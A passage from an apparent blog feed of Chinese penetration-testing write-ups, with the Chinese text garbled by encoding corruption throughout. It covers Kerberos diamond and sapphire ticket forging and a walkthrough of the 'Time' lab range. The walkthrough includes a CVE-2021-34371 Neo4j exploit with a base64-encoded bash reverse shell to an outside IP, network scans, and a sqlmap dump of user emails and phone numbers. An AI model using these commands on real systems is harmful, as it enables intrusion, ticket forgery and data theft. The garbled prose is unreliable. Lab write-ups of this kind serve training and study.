qAZUFZse3l5B7qwPP9WBJDLIZtNgV6GUt0CW9DVoIW0jdM1j2Hkl9B+CeM1xV7Vb2DMNh8gK6IfT7KWEHX8a+0GVwlQWkAW/O/IpjZc8+3rIkiIfCIqbGTwA/pnjfhsS2lOXetwW6S4jQ8C9SfKZbLWhPIxpRs9q9g3tWMUE22Pk06CD3T9GbdTEbVi0IvCQJSgNIGMu+sI9ISVZ78HNmYv2wAjjC0tcHusjG1DDj0obyfeg99icK1ZtZL0HmOcQCSwNZqqJDMOXix1uKXv8auJP0itVdUf/aYp8l0xDjVQRYzvefpuar1Ce2Dhguejc6nEfPKusFBPDNhYGw8WlSupnCjjwgNuuQT1WUXdNuTMpPAh3Grb0dj/2s3/WcqVI3P9eZMos6n+MnD8RJUjytPGAm+iKa30KmL3nJbxQEdBOCI9cY4SYmf09B9fQJhG7fEwyeUyjcRoCeOeLFlSM8MCs/qHUi+0MTkVyyiLYZWfcNY+20dCbwUtRz6zXUwQ4go8buZoZMKqnnio1rtzZxzqkqiYK+AbtRq7+9JPuX0chOr9GKqGQGEqaQZCqjOVCQKr1A+JK4mfhHxGwe0eDaDtGOTUnszGLhqQdmDVxNpKduOLjaQBN97ACnitC3Q1Ww6ZeCv51TVh2x787nNkYy5JWZrY0gd3FByb9UDkMmeODy/1oVireCYEfLAL8yUuu/REgZbkyIsxzSCeG/NUZN6ztjGn/IrJ06bEQS6OhuvPHKP51JIh/8HUaOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoCswKaADAgESoSIEIFPwBQgPPeImtpqHK3V4zobqMKDh0uVBzmEB/v5GuE7noQ0bC1JPT1RLSVQuT1JHohQwEqADAgEBoQswCRsHdGVzdDEyM6MHAwUAQOEAAKURGA8yMDI0MDIwNTA0Mjk0OFqmERgPMjAyNDAyMDUxNDI5NDhapxEYDzIwMjQwMjEyMDQyOTQ4WqgNGwtST09US0lULk9SR6kgMB6gAwIBAqEXMBUbBmtyYnRndBsLUk9PVEtJVC5PUkc= /service:cifs/owa2013.rootkit.org /ptt /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922814-b62d59c0-9e90-48e1-bdc2-e509edb3ae89.png"></p><p>æŸ¥çœ‹ç¥¨æ®å‘ç°å·²ç»å­˜åœ¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922692-99837381-7891-4bc1-b5ba-e63370da5a4a.png"></p><p>å°è¯• <code>dir</code>åŸŸæ§å’Œ<code>psexec</code>å‡æˆåŠŸ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922835-ee4de11a-b136-4e08-aa64-f5e739743130.png"></p><p>è¿™ç§æŠ€æœ¯ç›¸æ¯”äºé‡‘ç¥¨æ›´åŠ éšè”½ï¼Œå› ä¸ºè¿‡ç¨‹ä¸­æ‰€ç”³è¯·çš„TGTæ˜¯çœŸå®çš„ï¼Œåªæ˜¯ä¿®æ”¹äº†PACï¼Œç›¸å¯¹ä½ é‡‘ç¥¨ç¦»çº¿ç”Ÿæˆ<code>TGT</code>æ›´ç¬¦åˆOPSEC</p><h2 id="0x05-è“å®çŸ³ç¥¨æ®-Sapphire-Ticket"><a href="#0x05-è“å®çŸ³ç¥¨æ®-Sapphire-Ticket" class="headerlink" title="0x05 è“å®çŸ³ç¥¨æ® Sapphire Ticket"></a>0x05 è“å®çŸ³ç¥¨æ® Sapphire Ticket</h2><p>è“å®çŸ³ç¥¨æ®ä¸é’»çŸ³ç¥¨æ®ç±»ä¼¼ï¼Œç¥¨æ®ä¸æ˜¯ä¼ªé€ çš„ï¼Œè€Œæ˜¯é€šè¿‡è¯·æ±‚åè·å¾—çš„åˆæ³•ç¥¨æ®ã€‚ä»–ä»¬çš„åŒºåˆ«åœ¨äº<code>PAC</code>çš„ä¿®æ”¹æ–¹å¼ã€‚é’»çŸ³ç¥¨æ®æ˜¯ä¿®æ”¹äº†åˆæ³•<code>PAC</code>ä»¥æ·»åŠ ç‰¹æƒç»„ã€‚åœ¨è“å®çŸ³ç¥¨æ®ä¸­ï¼Œé«˜æƒé™ç”¨æˆ·<code>PAC</code>æ˜¯é€šè¿‡</p><p><code>S4U2Self+U2U</code>è·å¾—çš„ï¼Œç„¶åè¯¥<code>PAC</code>ä¼šæ›¿æ¢åŸæ¥çš„<code>PAC</code>ï¼Œç”±äºè¯¥ç¥¨æ®æ˜¯å®Œå…¨åˆæ³•å…ƒç´ ç»„åˆèµ·æ¥çš„ï¼Œæ‰€ä»¥æ˜¯æœ€éš¾æ£€æµ‹çš„ç¥¨æ®ã€‚</p><h3 id="S4U2self-U2U"><a href="#S4U2self-U2U" class="headerlink" title="S4U2self + U2U"></a>S4U2self + U2U</h3><p>ä¸ºäº†åœ¨ Kerberos åè®®å±‚é¢å¯¹çº¦æŸæ€§å§”æ´¾è¿›è¡Œæ”¯æŒï¼Œå¾®è½¯æ‰©å±•äº† <code>S4U2self</code> åè®®ï¼Œè€Œä½¿ç”¨ U2U å¯ä»¥åœ¨æ²¡æœ‰ SPN çš„æƒ…å†µä¸‹è¯·æ±‚ <code>S4U2Self</code>ã€‚</p><h3 id="å°è¯•ç”Ÿæˆè“å®çŸ³ç¥¨æ®"><a href="#å°è¯•ç”Ÿæˆè“å®çŸ³ç¥¨æ®" class="headerlink" title="å°è¯•ç”Ÿæˆè“å®çŸ³ç¥¨æ®"></a>å°è¯•ç”Ÿæˆè“å®çŸ³ç¥¨æ®</h3><p>åœ¨è¿™é‡Œä½¿ç”¨é­”æ”¹è¿‡çš„ <code>ticketer.py</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ShutdownRepo/impacket/tree/6c9a1aadbfc11e321858a640b596530535b11fd1</span><br></pre></td></tr></table></figure><p>å°†åŸŸæ§çš„ipåœ°å€åŠ å…¥hostsï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ticketer.py -request -impersonate &#x27;administrator&#x27; -domain &#x27;rootkit.org&#x27; -user &#x27;micle&#x27; -password &#x27;Admin12345&#x27; -aesKey &#x27;3e65833fc9930ea83015501ec30c161da401faf6cfed9526b9ceff16c8ade745&#x27; -domain-sid &#x27;S-1-5-21-3759881954-2993291187-3577547808&#x27; -nthash &#x27;c3d5042c67ef5f461d0ba6ecdd9ea449&#x27; &#x27;Sapphire&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923342-f15f079d-489d-405b-abfb-1a649ec8033c.png"></p><p>é€šè¿‡æŠ“åŒ…å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŒ‡å®šäº†è¦è·å–æœåŠ¡ç¥¨è¯çš„ç”¨æˆ·å<code>administrator</code> ï¼Œæ­¤å¤–æˆ‘ä»¬è¿˜ä¸ºç”¨æˆ·è¯·æ±‚äº†æœåŠ¡ç¥¨è¯ï¼Œæ‰§è¡Œ <code>U2U</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923186-65feb858-d341-4059-9350-ca76d1325c73.png"></p><p>ä½¿ç”¨<code>mimikatz</code>å¯¼å…¥è¯¥ç¥¨æ®ï¼ŒæˆåŠŸ<code>dir</code>åŸŸæ§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc ignored.ccache</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923259-0b1f25be-be36-40ec-9055-b7f64dfcafdf.png"></p><p>ç”±äºè¯¥ç¥¨æ®å¾ˆéš¾è¢«æ£€æµ‹åˆ°ï¼Œåªèƒ½é€šè¿‡äººå·¥æ’æŸ¥<code>krbrgt</code>è´¦æˆ·è¢«ç›—ç­‰æƒ…å†µå…¥æ‰‹</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw+YRpD&u_atoken=f52bd5554f81e725f08eebdd4ea25593&u_asig=0a472f9017425368091076282e0119">https://xz.aliyun.com/news/13032?time__1311=eqUxuDcDBD0Dg7CeDsjOxiqiKmx7Tw%2BYRpD&amp;u_atoken=f52bd5554f81e725f08eebdd4ea25593&amp;u_asig=0a472f9017425368091076282e0119</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Time</title>
      <link href="/2025/03/10/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/"/>
      <url>/2025/03/10/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/</url>
      
        <content type="html"><![CDATA[<p>å…ˆfscanæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.107.233</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.107.233:7687 open</span><br><span class="line">39.98.107.233:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-34371"><a href="#CVE-2021-34371" class="headerlink" title="CVE-2021-34371"></a>CVE-2021-34371</h2><p>7678æœ‰ä¸ªndayï¼ŒCVE-2021-34371åˆ©ç”¨ï¼ˆ<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget.jar rmi://39.99.147.195:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjE0OC4zMy81Njc4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ‰¾ä¸€ä¸‹flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741602823953-92635713-c082-4fc4-a05b-23b297d6a879.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741602870437-570782f5-a6ec-442b-b28d-514ff72ab204.png"></p><p>æç¤ºè®¤è¯æµç¨‹</p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æ¥ä¸‹æ¥å¸¸è§„æ€è·¯ï¼Œä¸Šä»£ç†ï¼Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(remote) neo4j@ubuntu:/tmp$ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.6.36  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe16:7073  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:16:3e:16:70:73  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 78768  bytes 112010111 (112.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 14275  bytes 1872331 (1.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 764  bytes 64981 (64.9 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 764  bytes 64981 (64.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(remote) neo4j@ubuntu:/tmp$ ./fscan -h 172.22.6.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.6.25     is alive</span><br><span class="line">(icmp) Target 172.22.6.36     is alive</span><br><span class="line">(icmp) Target 172.22.6.38     is alive</span><br><span class="line">(icmp) Target 172.22.6.12     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.6.38        code:200 len:1531   title:åå°ç™»å½•</span><br><span class="line">[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None</span><br><span class="line">å·²å®Œæˆ 11/11</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 13.741722334s</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.6.12     åŸŸæ§</span><br><span class="line">172.22.6.25     åŸŸå†…æœºå™¨</span><br><span class="line">172.22.6.36     å½“å‰æœºå™¨</span><br><span class="line">172.22.6.38     æŸåå°ç™»å½•ç•Œé¢</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹38è¿™å°æœºå™¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741603307885-da7f4f39-33d6-4ff6-afaa-231d0e73bc5f.png"></p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹</p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741603377193-f67c5f5f-d86a-4833-9d5d-d23926a74840.png"></p><p>æµ‹ä¸€ä¸‹sqlæ³¨å…¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741603537598-7d6d9b30-6e50-496d-a434-60073a8e9113.png"></p><p>ä¸Šsqlmapï¼Œçˆ†å‡ºæ¥flagå’Œä¸€äº›ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -r 1.txt --dump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+------------------+---------------+</span><br><span class="line">| id | password         | username      |</span><br><span class="line">+----+------------------+---------------+</span><br><span class="line">| 1  | bo2y8kAL3HnXUiQo | administrator |</span><br><span class="line">+----+------------------+---------------+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line">|245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |</span><br><span class="line">| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |</span><br><span class="line">| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |</span><br><span class="line">| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |</span><br><span class="line">| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |</span><br><span class="line">| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |</span><br><span class="line">| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |</span><br><span class="line">| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |</span><br><span class="line">| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |</span><br><span class="line">| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |</span><br><span class="line">| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |</span><br><span class="line">| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |</span><br><span class="line">| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |</span><br><span class="line">| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |</span><br><span class="line">| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |</span><br><span class="line">| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |</span><br><span class="line">| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |</span><br><span class="line">| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |</span><br><span class="line">| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |</span><br><span class="line">| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |</span><br><span class="line">| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |</span><br><span class="line">| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |</span><br><span class="line">| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |</span><br><span class="line">| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |</span><br><span class="line">| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |</span><br><span class="line">| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |</span><br><span class="line">| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |</span><br><span class="line">| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |</span><br><span class="line">| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |</span><br><span class="line">| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |</span><br><span class="line">| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |</span><br><span class="line">| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |</span><br><span class="line">| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |</span><br><span class="line">| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |</span><br><span class="line">| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |</span><br><span class="line">| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |</span><br><span class="line">| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |</span><br><span class="line">| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |</span><br><span class="line">| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |</span><br><span class="line">| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |</span><br><span class="line">| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |</span><br><span class="line">| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |</span><br><span class="line">| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |</span><br><span class="line">| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |</span><br><span class="line">| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |</span><br><span class="line">| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |</span><br><span class="line">| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |</span><br><span class="line">| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |</span><br><span 